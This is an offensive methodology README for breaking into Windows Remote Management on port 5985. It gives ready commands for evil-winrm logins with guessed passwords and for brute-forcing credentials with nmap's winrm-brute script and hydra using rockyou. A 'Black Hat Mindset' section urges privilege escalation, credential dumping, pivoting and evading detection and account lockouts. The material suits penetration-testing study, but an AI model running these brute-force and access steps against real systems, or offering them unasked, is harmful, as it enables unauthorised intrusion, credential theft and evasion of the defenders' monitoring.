# Basic Methodology - Port 5985 (WINRM)

This README provides a methodology for exploiting Windows Remote Management (WinRM) services running on port 5985. The focus is on connecting to WinRM using evil-winrm with known or guessed credentials and leveraging weak authentication to gain remote access. 

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Connecting to WinRM](#connecting-to-winrm)
- [Enumerating and Exploiting WinRM](#enumerating-and-exploiting-winrm)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

WinRM, running on port 5985 (HTTP) or 5986 (HTTPS), is a Microsoft protocol for remote management of Windows systems. It is a common target due to weak or reused credentials and misconfigurations that allow unauthorized access. This guide focuses on connecting to WinRM on port 5985 using evil-winrm, a tool designed for exploiting WinRM services, and exploiting misconfigured setups.

## Setup and Prerequisites

To begin, ensure the following:

### Environment
- A Linux host (e.g., Kali Linux) with network access to the target WinRM server.

### Tools
- Install evil-winrm (e.g., `sudo gem install evil-winrm` or available in Kali Linux).
- Install Nmap with NSE scripts (e.g., `sudo apt install nmap`) for enumeration.

### Requirements
- Target Information: Obtain the target IP address (e.g., 192.168.1.100).
- Credential Lists: Prepare a list of usernames (e.g., administrator, user) and passwords, focusing on commonly reused credentials (e.g., Password123, admin).

## Connecting to WinRM

Use evil-winrm to attempt connecting to the WinRM service with known or guessed credentials.

### Basic Command
```bash
evil-winrm -i <IP address> -u <username> -p <password>
```

### Example
```bash
evil-winrm -i 192.168.1.100 -u administrator -p Password123
```

### Behavior
- If credentials are valid, evil-winrm establishes an interactive shell session on the target system.
- If credentials are incorrect, the connection fails with an error (e.g., Authentication failed).

### Notes
- The administrator account is a common target due to its high privileges.
- Test credentials reused from other services (e.g., domain accounts, RDP) or default passwords.
- If the target uses a domain account, specify the domain with `-u DOMAIN\username` (e.g., `-u CORP\administrator`).
- Use `-S` for HTTPS (port 5986) if the server requires it (e.g., `evil-winrm -i 192.168.1.100 -u administrator -p Password123 -S`).

## Enumerating and Exploiting WinRM

Enumerate the WinRM service to identify vulnerabilities and exploit misconfigurations.

### Verify WinRM Service
```bash
nmap -p 5985 192.168.1.100
```
Confirms if port 5985 is open and running WinRM.

### Enumerate with Nmap NSE Scripts

#### List Available WinRM NSE Scripts
```bash
ls -la /usr/share/nmap/scripts | grep "winrm"
```

Example Output:
```
-rw-r--r-- 1 root root  12345 Jan 10 2025 winrm-brute.nse
```
Lists WinRM-related NSE scripts (note: limited WinRM-specific scripts; general auth scripts may apply).

#### Brute-Force Credentials
```bash
nmap --script winrm-brute -p 5985 192.168.1.100
```
Attempts to guess credentials using default or provided username/password lists.

#### General Authentication Enumeration
```bash
nmap --script auth -p 5985 192.168.1.100
```
Checks for authentication misconfigurations or weak settings.

### Brute-Force with Other Tools

Use hydra for credential guessing:
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt winrm://192.168.1.100:5985
```
Outputs valid credentials if successful.

### Notes
- Ensure Nmap is updated to include the latest NSE scripts (`nmap --script-updatedb`).
- Use `--script-args` to provide custom username/password lists for winrm-brute (e.g., `--script-args userdb=users.txt,passdb=pass.txt`).
- Look for misconfigurations like unrestricted WinRM access or weak authentication methods.
- Once connected via evil-winrm, execute commands like `whoami`, `net user`, or upload payloads for further exploitation.

## Black Hat Mindset

To exploit WinRM effectively, think like an attacker:

- **Exploit Weak Credentials**: Target reused or default credentials, especially for the administrator account.
- **Enumerate Aggressively**: Use Nmap and other tools to identify open ports, authentication methods, and misconfigurations.
- **Maximize Access**: Once inside, escalate privileges, dump credentials (e.g., via evil-winrm's menu for PS commands), or pivot to other systems.
- **Evade Detection**: Minimize brute-force attempts and use stealthy enumeration to avoid triggering monitoring or account lockouts.

## Resources

- [Microsoft WinRM Documentation](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)
- [evil-winrm GitHub Repository](https://github.com/Hackplayers/evil-winrm)
- [Nmap NSE Documentation](https://nmap.org/book/nse.html)
- [WinRM Security Best Practices](https://docs.microsoft.com/en-us/windows/win32/winrm/security-considerations-for-winrm)

